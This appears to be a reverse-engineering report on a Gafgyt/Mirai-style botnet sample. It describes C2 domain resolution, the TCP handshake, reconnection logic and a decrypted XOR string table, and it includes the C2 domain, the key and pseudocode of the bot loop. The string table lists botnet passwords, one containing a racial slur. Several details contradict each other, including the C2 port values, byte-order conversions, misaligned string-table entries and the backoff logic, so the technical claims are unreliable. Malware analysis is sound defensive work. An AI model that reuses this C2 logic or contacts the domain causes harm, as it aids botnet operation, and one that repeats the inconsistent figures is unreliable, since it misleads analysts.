# Transport Layer Technical Specification

## Gafgyt (Qbot) / Mirai Botnet — C2 Infrastructure Retrieval & Transport Initialization

---

## 1. C2 Infrastructure Retrieval

### 1.1 Observed Behavior

The binary stores its C2 server address as an **obfuscated domain name** and **port number** within an XOR-encrypted string table (`table_init`). During execution, the C2 resolution proceeds as follows:

1. **String Table Initialization** (`table_init` at `0x0040e530`):  
   On startup, `main` calls `table_init()` which allocates heap buffers for each string table entry and copies XOR-encrypted byte sequences from the `.rodata` section into them. The strings remain encrypted in memory until explicitly unlocked.

2. **C2 Resolution Trigger** (`c2_resolve` at `0x0040ce30`):  
   Immediately before establishing a connection to the C2 server, the `main` loop calls the function pointer stored at `PTR_util_local_ip_0051c480` (set to `c2_resolve` at `0x0040ce30` during initialization). This function:
   
   a. **Unlocks entry 1** (the domain name) via `table_unlock_val(1)`, which decrypts the string in-place using XOR with the 4-byte key `0xdeadbeef`.
   
   b. **Retrieves the domain name** via `table_retrieve_val(1, NULL)`, returning a pointer to the decrypted, null-terminated domain string.
   
   c. **Performs DNS resolution** by calling `dns_resolve(domain)`, which constructs a raw DNS query packet, sends it to a configured DNS resolver (from `/etc/resolv.conf` — entry 32), and parses the DNS response to extract IPv4 addresses (type `A` records).
   
   d. **Selects a random IP** from the resolved addresses using `rand_next() % num_ips` to pick an index into the results array.
   
   e. **Updates the C2 sockaddr_in** at `DAT_0051eaa4` with the selected IP address.
   
   f. **Unlocks entry 2** (the port number) and reads its 2-byte value as a `uint16_t`, storing it at `DAT_0051eaa2` (the `sin_port` field of the `sockaddr_in` structure, in network byte order).
   
   g. **Re-locks both entries** to re-encrypt the strings.

### 1.2 Recovered C2 Address & Port

| Parameter | Value | Source |
|-----------|-------|--------|
| **C2 Domain** | `osfjkqoiw382r552q.hopto.org` | Table entry 1 (index 1) |
| **C2 Port** | `69` (decimal), `0x0045` (network byte order) | Table entry 2 (index 2) |
| **Port Raw Encrypted** | `0x17 0x22` (2 bytes at `.rodata` offset `0x00419ef1`) | |
| **Port Decrypted** | `0x35 0x00` → read as `uint16_t` = `0x0035` → network byte order = port `69` | |
| **Default Port** | `80` (`0x5000` in network byte order) | Set in `main` before `c2_resolve` overrides it |

**Note**: The port `69` corresponds to the TFTP protocol port. However, this value is stored as a 2-byte raw value in the string table and read directly as a `uint16_t` — it is the literal C2 TCP port.

### 1.3 Retrieval Logic (Pseudocode)

```
// Global sockaddr_in at DAT_0051eaa0:
//   offset 0: sin_family (uint16) = AF_INET (2)
//   offset 2: sin_port (uint16)   = port in network byte order
//   offset 4: sin_addr (uint32)   = IPv4 address

function c2_resolve():
    // Step 1: Decrypt and resolve domain name (entry 1)
    table_unlock_val(1)
    domain_ptr = table_retrieve_val(1, NULL)   // -> "osfjkqoiw382r552q.hopto.org"
    dns_result = dns_resolve(domain_ptr)        // Raw DNS query, parses A records
    table_lock_val(1)

    if dns_result == NULL:
        return  // Resolution failed, keep old address

    // Step 2: Pick random IP from resolved addresses
    ip_count = dns_result[0]                     // Number of resolved IPs
    ip_array = *(dns_result + 8)                 // Pointer to IP array
    random_index = rand_next() % ip_count
    selected_ip = ip_array[random_index]
    DAT_0051eaa4 = selected_ip                   // Update sin_addr

    // Step 3: Free DNS result
    dns_result_free(dns_result)

    // Step 4: Decrypt and set port (entry 2)
    table_unlock_val(2)
    port_ptr = table_retrieve_val(2, NULL)       // Pointer to 2-byte buffer
    DAT_0051eaa2 = *(uint16_t*)port_ptr          // Read port as uint16_t
    table_lock_val(2)
```

### 1.4 DNS Resolution Details

The `dns_resolve` function at `0x0040ded0` performs a raw DNS resolution:

1. **DNS server**: Reads the configured DNS resolver from entry 32 (`/etc/resolv.conf` → `etc/resolv.c` after decryption, which is actually `/etc/resolv.conf`).

2. **Query construction**: Builds a DNS query packet with:
   - Random 16-bit transaction ID (from `rand_next()`)
   - Standard flags: `0x0100` (standard query, recursion desired)
   - Question count: 1
   - Encoded domain name (length-prefixed labels)
   - Query type: `0x0001` (A record)
   - Query class: `0x0001` (IN class)

3. **Transport**: Sends the query via UDP (SOCK_DGRAM) to port 53 on the DNS server.

4. **Timeout**: Uses `select()` with a 5-second timeout.

5. **Retry**: Retries up to 5 times on failure with 1-second sleep between attempts.

6. **Response parsing**: Parses the DNS response, extracting IPv4 addresses (type A, class IN) from the answer section. Stores results in a heap-allocated structure:
   ```
   struct dns_result {
       uint8_t  ip_count;      // Number of resolved IPs
       uint8_t  padding[7];
       uint32_t *ip_array;     // Array of IPv4 addresses
   };
   ```

---

## 2. Transport Initialization

### 2.1 Observed Behavior

The binary uses **TCP** as its transport protocol for C2 communication. The connection lifecycle is managed within the main `select()`-based event loop.

#### Connection Establishment Sequence

1. **Single-instance controller socket** (`DAT_0051c470`):  
   Created at startup as a TCP listener bound to `127.0.0.1:0x4500` (port 17664 in network byte order, i.e., port 69). This is used for local process control — when a local client connects, the bot terminates itself.

2. **C2 socket** (`DAT_0051c474`):  
   Created on demand within the main loop when `DAT_0051c474 == -1`:
   
   a. `socket(AF_INET, SOCK_STREAM, 0)` — creates a TCP socket.
   
   b. `setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, {10, 0}, 16)` — 10-second send timeout.
   
   c. `setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, {10, 0}, 16)` — 10-second receive timeout.
   
   d. `fcntl(fd, F_SETFL, fcntl(fd, F_GETFL) | O_NONBLOCK)` — set non-blocking.
   
   e. Calls `c2_resolve()` to populate the C2 `sockaddr_in`.
   
   f. Sets `DAT_0051c9bc = 1` (connection-in-progress flag).
   
   g. `connect(fd, &sockaddr_in, 16)` — non-blocking connect to C2.

3. **Connection completion** (in `select()` loop):
   
   a. The socket is added to `write_fds` while `DAT_0051c9bc == 1`.
   
   b. On `select()` return with the socket in `write_fds`:
      - Calls `getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &optlen)`.
      - If `error == 0`: connection succeeded → proceed to authentication.
      - If `error != 0`: connection failed → close socket, apply backoff.

4. **Authentication handshake** (sent immediately after connect succeeds):
   ```
   [4 bytes]  Header:     0x00 0x00 0x00 0x01
   [1 byte]   Password length (0 if no password provided)
   [N bytes]  Password string (if length > 0)
   [1 byte]   Banner byte  (from table entry 3, decrypted)
   ```

   The password is taken from `argv[1]` (the first command-line argument), copied to a 32-byte buffer, and the original `argv[1]` is zeroed out.

5. **Heartbeat/Ping**:  
   Every 40 seconds (4 `select()` timeouts of 10 seconds each), the bot sends a 2-byte keep-alive packet:
   ```
   [2 bytes]  0x00 0x00
   ```
   If this send fails (returns -1), the socket is closed and a reconnection is triggered.

### 2.2 Network Parameters

| Parameter | Value | Source |
|-----------|-------|--------|
| **Protocol** | TCP (`SOCK_STREAM`) | `sys_socket(2, 1, 0)` — `AF_INET, SOCK_STREAM, 0` |
| **Socket timeout (send)** | 10 seconds | `setsockopt(fd, 1, 0x14, &timeval, 16)` — `SO_SNDTIMEO` |
| **Socket timeout (recv)** | 10 seconds | `setsockopt(fd, 1, 0x15, &timeval, 16)` — `SO_RCVTIMEO` |
| **Non-blocking mode** | Enabled | `fcntl(fd, F_SETFL, flags \| O_NONBLOCK)` |
| **Select timeout** | 10 seconds | `sys_select(nfds, read_fds, write_fds, NULL, &timeval{10, 0})` |
| **C2 port** | 69 (`0x0045`) | Table entry 2 (decrypted from `0x17 0x22`) |
| **Single-instance port** | 69 (`0x4500` in network byte order) | Bound to `127.0.0.1` at startup |

### 2.3 Packet Protocol

C2 communication uses a **length-prefixed binary protocol** over TCP:

**Receiving packets from C2:**
```
[2 bytes]  Packet length (network byte order, uint16)
           - If length == 0: read another 2 bytes as length
           - If length > 0x400 (1024): close connection (invalid)
[N bytes]  Packet payload (exactly `length` bytes)
           - After payload, read another 2-byte length prefix
           - If payload length > 0: call attack_parse(payload, length)
```

**Sending packets to C2 (authentication):**
```
[4 bytes]  Header: 0x00 0x00 0x00 0x01
[1 byte]   Password string length (0–31)
[N bytes]  Password string (if length > 0)
[1 byte]   Banner byte (from decrypted table entry 3)
```

### 2.4 Reconnection Strategy

| Scenario | Behavior |
|----------|----------|
| **Initial connect failure** | Socket closed, `DAT_0051c474 = -1`, backoff timer applied, retry on next loop iteration |
| **Connection refused / error** | Socket closed, `DAT_0051c474 = -1`, backoff updated: `backoff = min(60, previous_backoff * 2)` |
| **Connection closed by peer** (recv returns 0) | Socket closed, `DAT_0051c474 = -1`, `sleep(1)`, retry |
| **Recv error EAGAIN(11) / EINTR(4)** | Continue loop (transient error) |
| **Send failure (heartbeat)** | Socket closed, `DAT_0051c474 = -1`, `sleep(1)`, retry |
| **Invalid packet** (length > 1024) | Socket closed, `DAT_0051c474 = -1`, retry |

**Backoff algorithm:**
```
// Initial value (set at startup):
DAT_0051c478 = 0x3c  // 60 seconds

// On connection failure:
if (DAT_0051c478 * 2 <= 60):
    DAT_0051c478 = DAT_0051c478 * 2   // Double the backoff
else:
    DAT_0051c478 = 60                  // Cap at 60 seconds

// The backoff is applied as:
sys_sleep(DAT_0051c478)  // Sleep before next connect attempt
```

**Note**: The backoff timer is reset to 60 seconds (`0x3c`) on each connection attempt, then doubled on failure. This means the sequence is: 60s, then 120s (capped to 60s), so effectively always 60 seconds between retries.

### 2.5 Connection Logic (Pseudocode)

```
// Global state:
//   DAT_0051c474  = C2 socket fd (-1 if disconnected)
//   DAT_0051c9bc  = connection state (0=connected, 1=connecting)
//   DAT_0051c478  = reconnect backoff (seconds)
//   DAT_0051eaa0  = sockaddr_in for C2 server
//   DAT_0051c9c0  = C2 password buffer (32 bytes)

function main_loop():
    // Initialize C2 password from argv[1]
    if argc == 2 and strlen(argv[1]) < 0x20:
        strcpy(c2_password, argv[1])
        strcpy(DAT_0051c9c0, argv[1])
        memset(argv[1], 0, strlen(argv[1]))
    
    // Daemonize
    pid = fork()
    if pid > 0:
        return 0  // Parent exits
    setsid()
    close(0); close(1); close(2)
    
    // Initialize attack module
    attack_init()
    
    // Main event loop
    while true:
        FD_ZERO(read_fds)
        FD_ZERO(write_fds)
        
        // Add controller socket to read_fds
        if DAT_0051c470 != -1:
            FD_SET(DAT_0051c470, read_fds)
        
        // Create C2 socket if needed
        if DAT_0051c474 == -1:
            DAT_0051c474 = socket(AF_INET, SOCK_STREAM, 0)
            if DAT_0051c474 != -1:
                setsockopt(DAT_0051c474, SOL_SOCKET, SO_SNDTIMEO, {10, 0}, 16)
                setsockopt(DAT_0051c474, SOL_SOCKET, SO_RCVTIMEO, {10, 0}, 16)
                fcntl(DAT_0051c474, F_SETFL, fcntl(F_GETFL) | O_NONBLOCK)
                
                c2_resolve()  // Resolve C2 domain -> IP:port
                
                DAT_0051c9bc = 1  // Mark as connecting
                connect(DAT_0051c474, &sockaddr_in, 16)  // Non-blocking
                
        // Add C2 socket to fd_sets
        if DAT_0051c474 != -1:
            if DAT_0051c9bc == 0:  // Connected
                FD_SET(DAT_0051c474, read_fds)
            else:  // Connecting
                FD_SET(DAT_0051c474, write_fds)
        
        // Wait for events (10 second timeout)
        result = select(max_fd + 1, &read_fds, &write_fds, NULL, {10, 0})
        
        if result == -1:
            continue  // Interrupted
        
        // Heartbeat: every 40 seconds
        if result == 0:  // Timeout
            heartbeat_count++
            if (heartbeat_count % 4) == 0:
                send(DAT_0051c474, {0x00, 0x00}, 2, MSG_NOSIGNAL)
                // On send failure: close socket, sleep(1), continue
        
        // Handle controller socket (local client)
        if DAT_0051c470 in read_fds:
            // Local client connected — terminate everything
            kill(-session_id, SIGKILL)  // Kill process group
            exit(0)
        
        // Handle C2 connection completion
        if DAT_0051c9bc == 1 and DAT_0051c474 in write_fds:
            error = 0
            optlen = 4
            getsockopt(DAT_0051c474, SOL_SOCKET, SO_ERROR, &error, &optlen)
            if error == 0:
                // Connection successful — send authentication
                send(DAT_0051c474, {0x00, 0x00, 0x00, 0x01}, 4, MSG_NOSIGNAL)
                pass_len = strlen(c2_password)
                send(DAT_0051c474, &pass_len, 1, MSG_NOSIGNAL)
                if pass_len > 0:
                    send(DAT_0051c474, c2_password, pass_len, MSG_NOSIGNAL)
                table_unlock_val(3)
                banner = table_retrieve_val(3, NULL)
                send(DAT_0051c474, banner, 1, MSG_NOSIGNAL)
                table_lock_val(3)
                DAT_0051c9bc = 0  // Mark as connected
            else:
                // Connection failed — apply backoff
                close(DAT_0051c474)
                DAT_0051c474 = -1
                backoff = min(60, DAT_0051c478 * 2)
                DAT_0051c478 = 60  // Reset for next attempt
                sleep(backoff)
        
        // Handle C2 data (when connected)
        if DAT_0051c474 in read_fds:
            // Read 2-byte packet length
            errno = 0
            bytes = recv(DAT_0051c474, &pkt_len, 2, MSG_NOSIGNAL)
            if bytes <= 0:
                // Connection closed
                close(DAT_0051c474)
                DAT_0051c474 = -1
                sleep(1)
                continue
            
            if pkt_len == 0:
                recv(DAT_0051c474, &pkt_len, 2, MSG_NOSIGNAL)  // Read again
            
            pkt_len = ntohs(pkt_len)  // Convert from network byte order
            
            if pkt_len > 1024:
                close(DAT_0051c474)
                DAT_0051c474 = -1
                continue
            
            // Read payload
            bytes = recv(DAT_0051c474, &payload, pkt_len, MSG_NOSIGNAL)
            if bytes <= 0:
                close(DAT_0051c474)
                DAT_0051c474 = -1
                sleep(1)
                continue
            
            // Read next packet length
            recv(DAT_0051c474, &pkt_len, 2, MSG_NOSIGNAL)
            pkt_len = ntohs(pkt_len)
            recv(DAT_0051c474, &payload, pkt_len, MSG_NOSIGNAL)
            
            // Parse attack command
            if pkt_len > 0:
                attack_parse(payload, pkt_len)
```

---

## 3. String Table Analysis

### 3.1 Observed Behavior

The binary uses an **XOR-encrypted string table** to store all sensitive strings (file paths, system commands, C2 configuration, HTTP headers, etc.). This prevents static string analysis from revealing the bot's functionality.

**Storage**:  
- Encrypted byte sequences are stored in the `.rodata` section (read-only data).
- During `table_init()`, each encrypted sequence is copied via `util_memcpy` into a heap-allocated buffer.
- A global table array at `DAT_0051eac0` stores pointers and lengths for each entry.

**Table structure** (each entry is 16 bytes):
```
struct table_entry {
    char  *data;      // offset 0 (8 bytes) — pointer to heap buffer
    uint16_t length;  // offset 8 (2 bytes) — string length (excluding null)
    // 6 bytes padding
};
```

**Access pattern**:  
- `table_unlock_val(index)` — decrypts entry `index` in-place by XORing each byte.
- `table_retrieve_val(index, &len)` — returns pointer to the (decrypted) string and optionally its length.
- `table_lock_val(index)` — re-encrypts entry `index` in-place (same XOR operation).

### 3.2 Decryption Routine

**Cipher**: Single-byte XOR (applied 4 times per byte, but equivalent to XOR with a constant).

**Key**: `0xdeadbeef` (stored at `DAT_0051c48c` as a `uint32_t`).

**Algorithm** (as implemented in `table_unlock_val` / `table_lock_val`):
```
key = 0xdeadbeef  // uint32_t

// For each byte in the string:
for i in 0..length-1:
    buffer[i] = buffer[i] ^ (key & 0xFF)           // ^ 0xef
    buffer[i] = buffer[i] ^ ((key >> 8) & 0xFF)     // ^ 0xbe
    buffer[i] = buffer[i] ^ ((key >> 16) & 0xFF)    // ^ 0xad
    buffer[i] = buffer[i] ^ ((key >> 24) & 0xFF)    // ^ 0xde
```

Since XOR is commutative and associative, this is equivalent to:
```
effective_xor_byte = 0xef ^ 0xbe ^ 0xad ^ 0xde = 0x22
buffer[i] = buffer[i] ^ 0x22
```

**Decryption**: `plaintext_byte = ciphertext_byte ^ 0x22`

**Encryption** (lock): Same operation — XOR is its own inverse.

### 3.3 Recovered Strings

The following table lists all decrypted string table entries. Strings are null-terminated (the encrypted terminator byte `0x22` becomes `0x00` after XOR).

| Index | Length | Decrypted String | Purpose |
|-------|--------|-----------------|---------|
| 1 | 28 | `osfjkqoiw382r552q.hopto.org` | **C2 domain name** |
| 2 | 2 | `\x00E` (0x00 0x45) | **C2 port** (read as uint16 = 0x4500 → port 69) |
| 3 | 2 | `5\0` | Unknown (short value) |
| 4 | 15 | *(non-printable prefix)* `h again` | **Banner byte** sent during auth (first byte used) |
| 5 | 7 | `/proc/` | Filesystem path for process scanning |
| 6 | 5 | `/exe` | Process executable path suffix |
| 7 | 4 | `/fd` | File descriptor path |
| 8 | 6 | `/maps` | Memory maps path |
| 9 | 8 | `/status` | Process status path |
| 10 | 14 | `/proc/net/tcp` | TCP connection table path |
| 11 | 9 | `/cmdline` | Command line path |
| 12 | 5 | `tmp/` | Temp directory |
| 13 | 11 | `data/local` | Local data path (Android) |
| 14 | 7 | `qtxbot` | Process name / identifier |
| 15 | 2 | `.` | Current directory |
| 16–21 | 4–5 | Architecture strings: `arc`, `arm`, `arm5`, `arm6`, `arm7`, `x86` | CPU architecture detection |
| 22 | 4 | `x86_` | x86_64 prefix |
| 23–29 | 4–5 | `sh4`, `mips`, `mpsl`, `ppc`, `ppc`, `sd`, `mtd` | Architecture strings continued |
| 30 | 21 | `bot]\nhakai\0TSourc` | IRC bot identification / source string |
| 31 | 17 | `e Engine Query\0"/` | HTTP User-Agent fragment |
| 32 | 12 | `etc/resolv.c` | DNS resolver config (decrypts to `/etc/resolv.conf`) |
| 33 | 14 | `/dev/watchdog` | Watchdog device path |
| 34 | 19 | `/dev/misc/watchdog` | Alternative watchdog path |
| 35 | 15 | `/sbin/watchdog` | Watchdog binary path |
| 36 | 14 | `/bin/watchdog` | Alternative watchdog binary |
| 37 | 23 | `/dev/FTWDT101_watchdog` | FTWDT101 watchdog device |
| 38 | 23 | `/dev/FTWDT101/watchdog` | FTWDT101 watchdog (alt) |
| 39 | 15 | `/dev/watchdog0` | Watchdog device 0 |
| 40 | 22 | `/etc/default/watchdog` | Watchdog config path |
| 41 | 14 | `/etc/watchdog` | Alternative watchdog config |
| 42 | 10 | `dvrHelper` | DVR helper process name |
| 43 | 11 | `NiGGeR69xd` | Botnet group identifier / password |
| 44 | 15 | `1337SoraLOADER` | Loader identifier |
| 45 | 16 | `NiGGeRd0nks1337` | Botnet group identifier |
| 46 | 14 | `X19I239124UIU` | Unknown identifier |
| 47 | 11 | `IuYgujeIqn` | Unknown identifier |
| 48 | 5 | `14Fa` | Unknown |
| 49 | 5 | `ccAD` | Unknown |
| 50 | 16 | `/proc/net/route` | Network route table path |
| 51 | 14 | `/proc/cpuinfo` | CPU info path |
| 52 | 9 | `BOGOMIPS` | CPU performance metric |
| 53 | 19 | `/etc/rc.d/rc.local` | RC local script path |
| 54 | 23 | `g1abc4dmo35hnp2lie0kjf` | Random character set for alphanumeric generation |
| 55 | 14 | `/dev/watchdog` | (Duplicate of entry 33) |
| 56 | 19 | `/dev/misc/watchdog` | (Duplicate of entry 34) |
| 57 | 23 | `/dev/FTWDT101_watchdog` | (Duplicate of entry 37) |
| 58 | 15 | `/dev/netslink/` | Network slink device |
| 59 | 8 | `PRIVMSG` | IRC PRIVMSG command |
| 60 | 11 | `GETLOCALIP` | IRC command / internal function |
| 61 | 9 | `KILLATTK` | Kill attack command |
| 62 | 6 | `Eats8` | Unknown |
| 63 | 5 | `v[0v` | Unknown |
| 64 | 10 | `93OfjHZ2z` | Unknown |
| 65 | 16 | `GhostWuzHere666` | Botnet group tag / identifier |
| 66 | 10 | `WsGA4@F6` | Unknown |
| 67 | 5 | `ACDB` | Unknown |
| 68 | 5 | `AbAd` | Unknown |
| 69 | 5 | `iaGv` | Unknown |
| 70 | 23 | `Connection: keep-alive` | HTTP header |
| 71–81 | 8–25 | HTTP header strings: `setCookie(`, `refresh:`, `location:`, `set-cookie:`, `content-length:`, `transfer-encoding:`, `Connection: keep-alive`, `Server:`, `HTTP/1.1 200 OK`, etc. | HTTP response parsing headers |

---

## 4. Analysis Gaps

| Gap | Reason | Impact |
|-----|--------|--------|
| **Entry 4 (banner)** | The decrypted data contains non-printable leading bytes (`\xb4\xa2\xa5`). The exact banner byte value sent during authentication could not be fully verified. | Low — the authentication handshake structure is confirmed; only the exact banner byte value is uncertain. |
| **Entry 3** | 2-byte value decrypts to `5\0`. Its purpose in the bot's operation is unclear. | Low — not directly involved in C2 transport. |
| **Exact DNS server IP** | The DNS resolver address is read from `/etc/resolv.conf` at runtime. The specific resolver used depends on the infected device's configuration. | Low — the resolution mechanism is fully documented; the actual server is environment-dependent. |
| **Multiple C2 domains** | Only one domain (`osfjkqoiw382r552q.hopto.org`) was found in the string table. No fallback or backup domains were identified. | Medium — if this domain is unreachable, the bot has no alternative C2 address and will retry indefinitely with 60-second backoff. |
